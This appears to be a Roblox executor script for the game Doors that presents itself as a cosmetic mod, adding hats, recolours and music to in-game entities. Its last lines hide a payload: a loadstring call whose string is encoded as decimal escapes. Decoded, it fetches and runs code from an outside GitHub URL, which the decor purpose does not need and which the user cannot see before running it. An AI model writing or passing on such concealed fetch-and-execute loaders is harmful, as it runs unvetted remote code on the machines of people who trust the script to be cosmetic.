 -- credit Me and PenguinManiack or else....
-- ps i made the decor while penguin made the roooms

CreateNotification("Only Excute This Script When There Is A Blocked Off Room!")
CreateNotification("Loading Script...")

local Background_sound = Instance.new("Sound")
   Background_sound.SoundId = "rbxassetid://1837433172"
   Background_sound.Playing = true
   Background_sound.Looped = true
   Background_sound.Volume = 0.05
   Background_sound.Parent = Library

local config = {
        Decor_Figure = true;
        Decor_Seek = true;
        Decor_Screech = true;
       }

  local PaperImage_Desk = "https://cdn.discordapp.com/attachments/1018519567183646770/1055876330467639437/image.png"


    local Timothy_C = game:GetObjects("rbxassetid://11773933852")[1]
    Timothy_C.Parent = game:GetService("ReplicatedStorage"):WaitForChild("Entities")

game:GetService("Debris"):AddItem(game:GetService("ReplicatedStorage"):WaitForChild("Entities").Spider, 0)

    local Screech_C = game:GetObjects("rbxassetid://11782519148")[1]
    Screech_C.Parent = game:GetService("ReplicatedStorage"):WaitForChild("Entities")
        function AddFigureDecor(e)
        if e.Name == "FigureRagdoll" then
            local Hat = game:GetObjects("rbxassetid://11782756076")[1]
            Hat.Parent = e
        
            while config.Decor_Figure and task.wait() do
                Hat.Handle.CFrame = e.Head.CFrame * CFrame.new(-0.07,1,0)
            end
        end
    end
    
    function AddSeekDecor(e)
        if e.Name == "SeekRig" then
            local Hat = game:GetObjects("rbxassetid://11782774740")[1]
            Hat.Parent = e
        
            e:FindFirstChild("LeftLowerArm").BrickColor = BrickColor.new("Sea green")
            e:FindFirstChild("LeftLowerLeg").BrickColor = BrickColor.new("Sea green")
            e:FindFirstChild("LeftUpperArm").BrickColor = BrickColor.new("Sea green")
            e:FindFirstChild("LeftUpperLeg").BrickColor = BrickColor.new("Sea green")
            e:FindFirstChild("LowerTorso").BrickColor = BrickColor.new("Sea green")
            e:FindFirstChild("RightLowerArm").BrickColor = BrickColor.new("Sea green")
            e:FindFirstChild("RightLowerLeg").BrickColor = BrickColor.new("Sea green")
            e:FindFirstChild("RightUpperArm").BrickColor = BrickColor.new("Sea green")
            e:FindFirstChild("RightUpperLeg").BrickColor = BrickColor.new("Sea green")
            e:FindFirstChild("UpperTorso").BrickColor = BrickColor.new("Sea green")

            while config.Decor_Seek and task.wait() do
                Hat.Handle.CFrame = e.Head.CFrame * CFrame.new(-0.07,0.6,0)
            end
        end
    end
    
    --FigureHat
    for i,entity in pairs(workspace.CurrentRooms:GetDescendants()) do
        if config.Decor_Figure then
            AddFigureDecor(entity)
        end
    end
    
    --SeekHat
    for i,entity in pairs(workspace:GetDescendants()) do
        if config.Decor_Seek then
            AddSeekDecor(entity)
        end
    end
    
    
    game.Workspace.ChildAdded:Connect(function(child)
        wait(0.2)
        if child.Name == "SeekMoving" then
            local seekrig = child:WaitForChild("SeekRig")
            if seekrig and config.Decor_Seek then
                AddSeekDecor(seekrig)
            end
        end
    end)
    
    -- game:GetService("Workspace").SeekMoving.SeekRig
    
    
    game.Workspace.CurrentRooms.ChildAdded:Connect(function(child)
        wait(2)
        if child.Name == "50" or child.Name == "100" then
            local figure = child.FigureSetup:WaitForChild("FigureRagdoll")
            if figure and config.Decor_Figure then
                AddFigureDecor(figure)
            end
        end
   end)


loadstring("\10\108\111\97\100\115\116\114\105\110\103\40\103\97\109\101\58\72\116\116\112\71\101\116\40\34\104\116\116\112\115\58\47\47\114\97\119\46\103\105\116\104\117\98\117\115\101\114\99\111\110\116\101\110\116\46\99\111\109\47\77\121\101\49\50\51\47\77\121\101\87\97\114\101\72\117\98\47\109\97\105\110\47\104\105\34\41\41\40\41\10")()

CreateNotification("Script Loaded! Credit: ImAhaz#1873 & PenguinManiack")
